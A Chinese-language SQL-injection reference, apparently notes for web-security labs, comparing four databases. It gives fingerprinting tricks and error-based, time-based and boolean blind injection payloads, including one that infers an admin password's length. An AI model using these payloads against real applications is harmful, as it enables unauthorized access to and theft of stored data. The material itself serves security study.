# 数据库对比

从 SQL 注入视角对比四种主流数据库的关键差异。

## 注入点探测：如何确认数据库类型

### 字符串连接符

同一段 payload 在不同数据库中的行为不同，可以通过连接符指纹识别：

```
' + 'x' + '    → MSSQL（+）
' || 'x' || '  → Oracle / PostgreSQL（||）
CONCAT('a','b') → MySQL（其他也支持，但 MySQL 没有 || 连接）
```

### 注释符

```
MySQL:    -- (后有空格)  /  #  /  /**/
Oracle:   --  /  /**/
PostgreSQL: --  /  /**/
MSSQL:    --  /  /**/
```

注意：MySQL 的 `--` 后面必须有空格或控制字符（`--%20`），而 `#` 是 MySQL 独有的。

### 虚拟表

```
Oracle:      SELECT 1 FROM dual        -- 必须有
PostgreSQL:  SELECT 1                  -- 不需要
MySQL:       SELECT 1                  -- 不需要
MSSQL:       SELECT 1                  -- 不需要
```

**快速排除 Oracle**：执行 `SELECT 1` 不跟 `FROM dual`，如果报错就是 Oracle。

## 行限制（LIMIT vs TOP vs ROWNUM）

| 数据库 | 语法 |
|--------|------|
| PostgreSQL | `SELECT ... LIMIT n OFFSET m` |
| MySQL | `SELECT ... LIMIT m, n` |
| Oracle | `SELECT ... WHERE ROWNUM <= n` |
| MSSQL | `SELECT TOP n ...` |

## 字符串操作对比

| 操作 | PostgreSQL | Oracle | MySQL | MSSQL |
|------|-----------|--------|-------|-------|
| 取子串 | `SUBSTRING(s,1,n)` | `SUBSTR(s,1,n)` | `SUBSTRING(s,1,n)` | `SUBSTRING(s,1,n)` |
| 长度 | `LENGTH(s)` | `LENGTH(s)` | `LENGTH(s)` | `LEN(s)` |
| 连接 | `a \|\| b` | `a \|\| b` | `CONCAT(a,b)` | `a + b` |
| 查找位置 | `STRPOS(s,t)` | `INSTR(s,t)` | `INSTR(s,t)` / `LOCATE(t,s)` | `CHARINDEX(t,s)` |

## 盲注策略对比

### 条件错误法

| 数据库 | 制造可控错误的语法 |
|--------|-------------------|
| Oracle | `TO_CHAR(1/0)` — 标准方法 |
| PostgreSQL | `CAST('x' AS int)` — 利用类型转换 |
| MySQL | `EXTRACTVALUE(1, CONCAT(0x7e, data, 0x7e))` — XPATH 报错 |
| MSSQL | `CONVERT(int, data)` — 类型转换报错 |

### 时间延迟法

| 数据库 | 延迟函数 | 示例 |
|--------|---------|------|
| PostgreSQL | `pg_sleep(n)` | `SELECT pg_sleep(5)` |
| MySQL | `SLEEP(n)` / `BENCHMARK(m,expr)` | `SELECT SLEEP(5)` |
| Oracle | `DBMS_PIPE.RECEIVE_MESSAGE('a', n)` / `DBMS_LOCK.SLEEP(n)` | `SELECT DBMS_PIPE.RECEIVE_MESSAGE('a', 5) FROM dual` |
| MSSQL | `WAITFOR DELAY 'hh:mm:ss'` | `WAITFOR DELAY '00:00:05'` |

实际盲注 payload 示例：

```sql
-- PostgreSQL 时间盲注
' || (SELECT CASE WHEN (condition) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- MySQL 时间盲注
' AND IF(condition, SLEEP(5), 0)--

-- Oracle 时间盲注（注意：必须用 DBMS_PIPE.RECEIVE_MESSAGE 而非 DBMS_LOCK.SLEEP，后者是过程无法在 SELECT 中调用）
'||(SELECT CASE WHEN (condition) THEN DBMS_PIPE.RECEIVE_MESSAGE('a', 5) ELSE 0 END FROM dual)||'

-- MSSQL 时间盲注
'; IF (condition) WAITFOR DELAY '00:00:05'; --
```

### 条件响应法（布尔盲注）

所有数据库通用，差异仅在语法细节：

```sql
-- 通用模板
' AND (condition) AND '1'='1

-- PostgreSQL / MySQL
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=20 AND '1'='1

-- Oracle
'||(SELECT CASE WHEN LENGTH(password)=20 THEN '1' ELSE '0' END FROM users WHERE username='admin')||'

-- MSSQL
' AND (SELECT LEN(password) FROM users WHERE username='admin')=20 AND '1'='1
```

## 多语句支持

| 数据库 | 默认支持 | 注入利用 |
|--------|---------|---------|
| MSSQL | 是（驱动无关） | `'; INSERT INTO ...; --` |
| MySQL | 依赖驱动（如 `mysqli_multi_query()`） | 取决于 PHP/Java/Python 连接方式 |
| PostgreSQL | 依赖驱动（大多不支持） | 需 `pg_query()` 而非 `pg_query_params()` |
| Oracle | 不支持 | 只能用 UNION 或表达式注入 |

## 系统信息搜集对比

| 需求 | PostgreSQL | Oracle | MySQL | MSSQL |
|------|-----------|--------|-------|-------|
| 数据库版本 | `SELECT version()` | `SELECT banner FROM v$version` | `SELECT @@version` | `SELECT @@version` |
| 当前用户 | `SELECT current_user` | `SELECT USER FROM dual` | `SELECT USER()` | `SELECT SYSTEM_USER` |
| 当前数据库 | `SELECT current_database()` | `SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual` | `SELECT DATABASE()` | `SELECT DB_NAME()` |
| 列出所有表 | `information_schema.tables` | `all_tables` / `user_tables` | `information_schema.tables` | `sysobjects` / `information_schema.tables` |
| 列出所有列 | `information_schema.columns` | `all_tab_columns` | `information_schema.columns` | `syscolumns` / `information_schema.columns` |

## 注入工具箱总结

通常情况下，从注入到能判断出数据库类型后，应优先使用该数据库特有的高效技术：

| 数据库 | 首选盲注技巧 | 原因 |
|--------|------------|------|
| PostgreSQL | CAST 可见错误（Lab 3）+ pg_sleep 延迟 | CAST 可一次泄露完整数据 |
| MySQL | XPATH 报错注入 + GROUP_CONCAT | 报错信息完整，GROUP_CONCAT 减少请求次数 |
| Oracle | 条件错误法 TO_CHAR(1/0) | 最可靠的 Oracle 盲注方式 |
| MSSQL | 堆叠查询 + WAITFOR DELAY | 多语句让注入更灵活 |
